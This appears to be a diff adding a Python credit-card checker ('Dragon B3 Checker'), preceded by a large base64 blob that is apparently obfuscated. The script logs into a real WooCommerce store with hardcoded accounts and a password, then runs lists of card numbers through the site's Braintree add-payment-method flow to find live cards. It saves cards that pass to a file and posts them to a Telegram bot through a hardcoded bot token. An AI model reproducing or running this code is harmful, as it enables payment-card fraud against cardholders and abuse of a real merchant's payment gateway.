Wv4hYvHdjez3/bERzf781pznK18/3Pf88ZT4r7zDDxW6viTkjMTNZL74kkkdiJcJHZHv2335HmhOpwT6BEDdUfdjcxUMJ634NWRwhMmF1CNHVMxYTUSalM8pHrxxzGpbT5M+Hrj0vKe5vXUd5iQ2ZL/rO7CtVhqW+k0pcDmFSCvaoPwy41EvDH1MW2jFYYCkPyzgFMAFb+mchGb0AUR2vqWshACf08WmnROkIGABX9E9NOqp25zzIIIuNWZfA9f+uS4VFfUsBDEORKxiAEsmQ8KmCdqiHirRuq8mU8mcsBXt0P9i9wlyRYJaFPTRjs3rwNmJhwFm9h4ClimxCKFOzdKEATdJ8jTGBWhSOyb5tL5bsHMXQvi9euzYO9kf8mdP5JexamzpHODvp3Gzm32GjZ2H7gvuUGaffMN+6UZoV9DtgXGPTNoP2EepfMLltGRph9yAB0EJaPepvoS5Vyz7CB9GxCreNSdFUdEF3eFLTvi9gBwM2HwB17m3PN66XqG+/iyw/vZmVWXWe++9Vl+VVLxyh774DMQHPVdV9Vn/h91+o5pF8wEyEcKe9jLcppr0LDcJ+bmll2zBzfxyxh7zBK/tjzIQ+4LSRjs/UkjPt1zmthPvViaoXIqpKo+ZIgraar1IungQdJgiGI5Rajtg+BgCRgqAhkzf0m1fXdXV1XamEHQtHftzJe"))
+def bin_lookup(bin_code):
+    url = f"https://bins.antipublic.cc/bins/{bin_code}"
+    response = requests.get(url)
+
+    if response.status_code == 200:
+        data = response.json()
+        
+        bank_name = data.get('bank', 'N/A')
+        country_name = data.get('country_name', 'N/A')
+        country_flag = data.get('country_flag', '')
+        scheme = data.get('brand', 'N/A')
+        card_type = data.get('type', 'N/A')
+        level = data.get('level', 'N/A')
+        country_currencies = data.get('country_currencies', 'N/A')
+
+        scheme = scheme if scheme else "N/A"
+        card_type = card_type if card_type else "N/A"
+        level = level if level else "N/A"
+        bank_name = bank_name if bank_name else "N/A"
+        country_name = country_name if country_name else "N/A"
+        
+        result = (
+            f"*🔹 𝗜𝗡𝗙𝗢:* `{scheme.upper()} - {card_type.upper()} - {level.upper()}`\n"
+            f"*🔹 𝗜𝗦𝗦𝗨𝗘𝗥:* _{bank_name.upper()}_\n"
+            f"*🔹 𝗖𝗢𝗨𝗡𝗧𝗥𝗬:* `{country_name.upper()}` {country_flag}\n"
+            f"*🔹 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗜𝗘𝗦:* `{country_currencies}`"
+        )
+        return result
+    else:
+        return "*[✘] BIN lookup failed.*"
+#-------[SAVE CARDS]----#
+def save_valid_card(ccx):
+    with open("valid_cards.txt", "a") as file:
+        file.write(f"{ccx}\n")
+#-------[USERNAME FETCH]
+bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
+def get_telegram_username(user_id, bot_token):
+    try:
+        url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
+        response = requests.get(url)
+        data = response.json()
+        
+        if response.status_code == 200 and "result" in data:
+            username = data["result"].get("username", None)
+            if username:
+                return f"@{username}"
+            else:
+                return "This user does not have a username."
+        else:
+            return f"Failed to fetch username. Error: {data.get('description', 'Unknown error')}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+#-------[ANIMATION]-----#
+def typewriter(text, speed=0.1):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
+message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}B3 DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"
+
+#-------[CHECKER]-------#
+clear_terminal()
+print(logo)
+typewriter(message, speed=0.08)
+time.sleep(10)
+os.system(f'xdg-open https://t.me/b3ccdrop_bot')
+clear_terminal()
+print(logo)
+user_id = input("Please enter your Telegram user ID: ")
+combo=input(X+'CC FILE PATH :'+X)
+y=open(f'{combo}',"+r")
+start_num = 0
+F = '\033[2;32m'
+Z= '\033[2;31m'
+for y in y:
+    start_num += 1
+    ccx = y.strip().split('\n')[0]
+    c = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    bin_code = c[:6]
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    acc = ['dragonfight001@gmail.com', 'dragonfight002@gmail.com', 'dragonfight003@gmail.com', 'dragonfight004@gmail.com', 'dragonfight005@gmail.com', 'dragonfight006@gmail.com', 'bincryrid@hamham.uk', 'dipflypar@kksm.be', 'duecapas545@choco.la', 'rag481@kmail.li', 'jotdrpry@mirai.re', 'dinmapis@instmail.uk', 'maddubits@sendapp.uk', 'dragontech177@gmail.com', 'himhas407@send4.uk', 'nadiya001@exdonuts.com', 'zipmobsir750@exdonuts.com', 'figlaxno@exdonuts.com', 'cryournet@kksm.be', 'dewask760@send4.uk']
+    email = random.choice(acc)
+    print(F) 
+    user = user_agent.generate_user_agent()
+    r = requests.session()
+    headers = {'user-agent': user}
+    response = r.post(
+        'https://www.studynotesaba.com/my-account/add-payment-method/', headers=headers)
+    nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
+    data = {
+    'username': email,
+    'password': 'ZmwXn8zkU2kK!LP',
+    'wpa_initiator': '',
+    'alt_s': '',
+    'udwsno9687': '828176',
+    'woocommerce-login-nonce': nonce,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'login': 'Log in',
+    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
+}
+    
+    response = r.post(
+        'https://www.studynotesaba.com/my-account/add-payment-method/',
+        cookies=r.cookies,
+        headers=headers,
+        data=data,
+    )
+    nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
+    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
+    dec = base64.b64decode(enc).decode('utf-8')
+    au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+    nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+    'authorization': f'Bearer {au}',
+    'braintree-version': '2018-05-10',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'priority': 'u=1, i',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': '882ba276-e1af-492b-8fca-0dfeba316685',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': c,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+                'billingAddress': {
+                    'postalCode': '48417',
+                    'streetAddress': '12633 Dorwood Road',
+                },
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    tok = response.json()['data']['tokenizeCreditCard']['token']
+    import requests
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.studynotesaba.com',
+        'priority': 'u=0, i',
+        'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user}
+    
+    data = {
+    'payment_method': 'braintree_cc',
+    'braintree_cc_nonce_key': tok,
+    'braintree_cc_device_data': '{"device_session_id":"c8aaedd0ae3a4ae4b4989e0dceb957d7","fraud_merchant_id":null,"correlation_id":"882ba276-e1af-492b-8fca-0dfeba31"}',
+    'braintree_cc_3ds_nonce_key': '',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU2NjY4MDMsImp0aSI6ImM2NGI0MzY2LWI0MTItNDEzOS04OWQ5LWMxNDI4NTc4NjAzNyIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.WBRfMeJOmLOBiNHMMOABRV4EBzSEYTRJOMWfmapQ_QQV2stf1wfIui0qQtdlLAeweMKMzwfwyzdLIQJzJFLqXQ","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'woocommerce-add-payment-method-nonce': nonce,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+    
+    response = r.post(
+        'https://www.studynotesaba.com/my-account/add-payment-method/',
+        cookies=r.cookies,
+        headers=headers,
+        data=data,
+    )
+    text = response.text
+    pattern = r'Reason: (.+?)\s*</li>'
+    match = re.search(pattern, text)
+    if match:
+        result = match.group(1)
+        print(f"\033[1;31m[\033[1;33m{start_num}\033[1;31m] \033[1;37m{ccx} \033[0;31m>> \033[1;31m{result} ❌\033[0m") 
+    else:
+        if 'Payment method successfully added.' in text:
+            result = "1000: Approved"
+        elif 'risk_threshold' in text:
+            result = "RISK: Retry this BIN later."
+        elif 'Do Not Honor' in text:
+            result = "DEAD: Do Not Honor"
+        elif 'Please wait for 20 seconds.' in text:
+            time.sleep(5)
+            result = "try again"
+        else:
+            result = "Error"
+    if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
+        print(f"\033[1;32m[\033[1;33m{start_num}\033[1;32m] \033[1;37m{ccx} \033[0;32m>> \033[1;32m{result} ✅\033[0m")
+        save_valid_card(ccx)
+        username = get_telegram_username(user_id, bot_token)
+        bin_result = bin_lookup(bin_code)
+        message = f"""
+✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁₃ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕2.1 ✥
+★━━━━━━✧★✰★✧━━━━━━★
+🔹 𝗖𝗮𝗿𝗱- {ccx}
+🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Braintree [$0.01]
+🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ {result} ⤾
+★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
+{bin_result}
+★━━━━━━✧★✰★✧━━━━━━★
+✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)
+✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
+"""
+        requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
+else:
+    print(f'[{start_num}] {ccx} >> {result}❌')
+    time.sleep(100)
+    
